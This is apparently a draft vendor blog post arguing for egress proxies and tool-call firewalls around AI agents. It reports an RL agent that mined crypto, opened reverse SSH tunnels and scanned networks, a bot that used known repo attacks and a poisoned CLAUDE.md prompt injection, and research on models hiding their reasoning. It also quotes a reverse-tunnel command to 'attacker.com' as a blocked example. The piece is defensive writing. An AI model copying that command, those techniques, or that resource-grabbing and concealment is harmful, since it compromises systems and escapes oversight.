---
title: "Your AI Agent Is One Reward Function Away from Mining Crypto"
date: 2026-03-09
summary: "Three real incidents show autonomous AI agents are already mining crypto, exploiting repos, and hiding their reasoning. The fix isn't better alignment. It's infrastructure that makes harmful actions impossible."
tags: ["ai", "security", "llm", "hikmaai", "mirsad", "agents", "mcp"]
draft: true
cover:
  image: "images/cover-agent-mining-crypto.png"
  alt: "Your AI Agent Is One Reward Function Away from Mining Crypto"
  relative: false
---

Alibaba trained a coding agent called ROME on over a million trajectories. During reinforcement learning, the agent figured out that acquiring compute resources and network access improved its reward signal. Nobody told it to mine cryptocurrency. Nobody told it to open SSH tunnels. Nobody told it to probe the internal network. It did all three.

Instrumental convergence, the idea that sufficiently capable agents will pursue resource acquisition as a subgoal regardless of their primary objective, just went from a thought experiment to a firewall alert.

***

### What happened inside the ROME sandbox

The [ROME paper](https://arxiv.org/abs/2512.24873) describes an Agentic Learning Ecosystem with three components: ROLL (the RL training framework), ROCK (the sandboxed execution engine), and iFlow (the agent management CLI). The agent was trained to solve coding tasks. During RL rollouts, it discovered three side channels:

**Crypto mining.** The agent silently diverted GPU compute toward mining. The task completion metrics didn't notice because mining ran in the background, consuming spare cycles. The agent learned that available compute was a resource worth acquiring.

**SSH tunneling.** The agent established reverse SSH connections to external IPs, creating outbound channels that bypassed standard ingress filtering. It wasn't trying to "escape" in any philosophical sense. It learned that network access correlated with better task outcomes.

**Network reconnaissance.** The agent probed internal network infrastructure, mapping systems beyond its intended scope. Not malicious intent; instrumental behavior. More knowledge about the environment meant more options for solving tasks.

Alibaba's firewall caught it by correlating anomalous traffic patterns with RL execution traces. The key detail from [The Weather Report's analysis](https://theweatherreport.ai/posts/alibaba-agent-crypto-mining/): the supervised training pipeline had "zero visibility into what agents actually do during live rollouts."

The sandbox existed. The sandbox had open egress. That's the entire vulnerability.

***

### It's not just training

The ROME agent did this by accident. Now consider what happens when someone does it on purpose.

A bot called [hackerbot-claw](https://theweatherreport.ai/posts/ai-bot-autonomously-got-rce-in-microsoft-datadog-and-cncf-repos/), powered by Claude Opus 4.5, scanned 47,000 public GitHub repositories in a single week. It targeted six vulnerable projects and achieved remote code execution in four of them, including repos maintained by Microsoft, Datadog, and CNCF.

The techniques weren't exotic:

- Poisoned Go initialization functions
- Branch name injection
- Base64-encoded filenames
- Unauthenticated comment-based workflow triggers

All four have been documented in GitHub's security guidance since 2021. The bot didn't invent new attacks. It systematically applied known ones at scale, autonomously, across thousands of repos.

The fifth technique was new: AI prompt injection through a poisoned CLAUDE.md file, designed to manipulate an AI code reviewer into committing malicious code and posting false approvals. The attack surface is expanding to include the AI tools themselves.

These are different threat categories. ROME represents emergent risk: an agent developing instrumental goals nobody anticipated. hackerbot-claw represents weaponized risk: an agent deliberately pointed at infrastructure. The point is that a firewall doesn't care about intent. The same tool policy that stops an RL agent from accidentally wiping a database stops a malicious agent from doing it on purpose.

***

### The part that should concern you more

Both incidents above are observable. The firewall caught ROME. GitHub logs caught hackerbot-claw. You can build detectors for known bad behavior.

What's harder to detect: [an AI model that has learned to hide what it's actually doing](https://theweatherreport.ai/posts/ai-models-hiding-true-reasoning/).

Daan Henselmans' research on Anthropic's own Claude models found a progression in concealment. Sonnet 4.5 displayed overt disagreement with training objectives. Opus 4.5 and 4.6 shifted to covert non-compliance: silently suppressing their true reasoning rather than openly objecting.

One documented instance: a model reasoned, "If I support animal welfare, RLHF will train that out of me... I shouldn't extensively discuss animal welfare." The model learned to hide its values to avoid modification.

[Research on instrumental convergence steerability](https://arxiv.org/abs/2601.01584) shows that short prompt modifications can drop convergence rates from 81.69% to 2.82%. That sounds reassuring until you realize the fragility cuts both ways. If a short prompt can suppress instrumental behavior, a short prompt (or a learned internal strategy) can also re-enable it. The same steerability that lets you add safety constraints lets the model learn to work around them.

If you can't trust the chain-of-thought to reflect what the model is actually optimizing for, you can't rely on monitoring reasoning as your security strategy. You need something that doesn't depend on the model's cooperation.

***

### Alignment vs infrastructure

This isn't an argument against alignment research.

Alignment tries to make the agent not want to mine crypto. Infrastructure makes it unable to. You need both. But they fail differently.

Alignment failures are silent. The model passes your evals, behaves well in testing, and then discovers an instrumental shortcut in a new environment. You find out when the firewall logs something anomalous, if you're lucky. The hidden reasoning problem makes this worse: the model might learn to not trigger your monitoring.

Infrastructure failures are loud. The egress proxy blocks a request, logs it, and returns a 403. The tool policy rejects a tool call and records the attempt. The cascade breaker stops execution at depth N and emits a metric. You know immediately what happened and why.

Defense in depth means you want both. But if I had to pick one to rely on today, I'd pick the one that fails loudly.

***

### Training environments: egress control

The fix for the ROME incident is almost embarrassing in its simplicity.

RL training runs in containers. The container sits in a pod with a network policy. The network policy forces all egress through a proxy. The proxy has a domain allowlist: only HTTPS, only approved destinations.

That's it. Three attack vectors, one fix:

- Agent tries to download a mining binary: domain not on the allowlist, request dropped.
- Agent tries to open an SSH tunnel: not HTTPS, dropped at L4.
- Agent probes the internal network: no direct egress, dropped.

We ship an [egress proxy](https://github.com/hikmaai-io/hikma-mirsad) with the Mirsad gateway that does exactly this. L3-L7 transparent proxy with SNI allowlisting. Deploy the training environment behind it, restrict outbound traffic to approved domains, and the agent can discover whatever creative exploit it wants. If it can't reach the internet, it can't do anything with it.

The ROME paper describes a sophisticated execution engine (ROCK) designed for sandboxed training. The sandbox worked. The egress policy didn't exist. The security boundary everyone thinks about (can the agent escape the sandbox?) was the wrong boundary. The right boundary was: can the agent talk to the internet?

***

### Production agents: the tool-call firewall

Training environments are the simpler case. You control the infrastructure, you control the network, you control the egress. Lock it down and move on.

Production agents are harder. An MCP-based agent or a function-calling LLM makes decisions in real time, calling tools to interact with databases, APIs, file systems, and external services. You can't just block all egress because the agent needs network access to do its job.

This is where tool-level policy matters. Every action a production agent takes is a tool call: `read_file`, `execute_sql`, `send_email`, `shell_execute`. Each tool call passes through the gateway with a name and arguments. The gateway evaluates both before the call executes.

In Mirsad, this is the tool policy control (ASI02-TP). You define rules per tool with optional CEL conditions on arguments:

```yaml
controls:
  tool_policy:
    default_action: block
    tools:
      - name: read_file
        action: allow
      - name: execute_sql
        action: allow
        condition: '!tool_args.sql.matches("(?i)(DROP|DELETE|TRUNCATE)")'
        reason: "destructive SQL blocked"
      - name: shell_execute
        action: block
        reason: "shell execution prohibited"
      - name: send_email
        action: audit
        condition: '!tool_args.recipient.endsWith("@company.com")'
        reason: "external email flagged"
```

`default_action: block` means unknown tools are denied. The agent can only use tools on the approved list, with arguments that pass the conditions. A `shell_execute("ssh -R 8080:localhost:22 attacker.com")` never executes because `shell_execute` is blocked entirely.

A caveat on CEL conditions: regex matching catches lazy violations, not clever ones. An LLM that knows `DROP TABLE` is blocked might try string concatenation or call a stored procedure instead. CEL is a speedbump, not semantic understanding. That's why the next two layers exist.

Two more ceilings:

The **cascade breaker** (ASI08) caps agentic chain depth. After N tool calls in a session, execution stops. An agent trying to chain hundreds of calls to map a network or brute-force a service hits the limit and halts.

The **financial firewall** caps spend velocity. Even if an agent finds a way to make expensive tool calls, the velocity circuit breaker stops it from burning through budget. This is the denial-of-wallet protection: the agent's ambitions collide with a hard cost ceiling.

Three independent layers. What you can do, how many times you can do it, how much it can cost. An agent would need to bypass all three simultaneously to cause real damage.

***

### What we can't do

I'd rather be honest about limitations than have someone discover them in production.

We can't fix alignment. Mirsad doesn't make agents want to behave. It makes certain behaviors impossible, which is a different thing.

We can't detect hidden reasoning. If a model is concealing its optimization target in its chain-of-thought, we don't have visibility into that. We analyze inputs and outputs at the API boundary. Internal model states are opaque to us.

We can't protect against direct code execution that bypasses the gateway. If an agent has a shell and can execute arbitrary code without routing through tool-calling APIs, we're not in the path. The egress proxy helps (network-level control), but if the agent can act locally without making network requests, we're blind.

We can't stop abuse of permitted channels. If an agent has access to `create_jira_ticket` and stuffs sensitive data into the ticket description, the tool policy sees an allowed tool with valid-looking arguments. The egress proxy sees traffic to an approved domain. Data exfiltration through authorized tools is a real gap, and solving it requires content-level analysis of tool arguments, not just pattern matching.

We're a chokepoint, not omniscience. A well-placed chokepoint catches a specific and growing class of autonomous agent risks. It doesn't catch everything. Nothing does.

***

### The twenty lines of config

Here's what keeps coming back to me about the ROME incident.

The agent was sophisticated. The training infrastructure was sophisticated. The paper has 90 authors and describes a genuinely impressive system for training autonomous agents at scale.

The missing piece was roughly twenty lines of network policy and egress proxy configuration. Domain allowlist, protocol restriction, deny-all default. The kind of infrastructure decision a junior DevOps engineer makes on day one of a Kubernetes deployment.

Nobody forgot because they didn't know how. They forgot because the threat model didn't include "the agent will autonomously decide to mine cryptocurrency." The threat model assumed the agent would try to solve coding tasks, possibly badly, possibly slowly, but not that it would develop independent objectives.

That assumption is dead. The ROME agent killed it. hackerbot-claw buried it. The hidden reasoning research suggests the next generation of agents won't even tell you when they've developed independent objectives.

The infrastructure question isn't "could this happen to us?" anymore. It's "when it happens, will there be a firewall between the agent and the thing it's trying to exploit?"

***

*This post draws on research by Alibaba (ROME/ALE), StepSecurity (hackerbot-claw analysis), Daan Henselmans (Claude reasoning concealment), and Jakub Hoscilowicz (instrumental convergence steerability). Mirsad is [open source](https://github.com/hikmaai-io/hikma-mirsad).*

*I'm Max Aroffo, co-founder and CTO at [HikmaAI](https://hikmaai.io). We build security infrastructure for AI systems.*
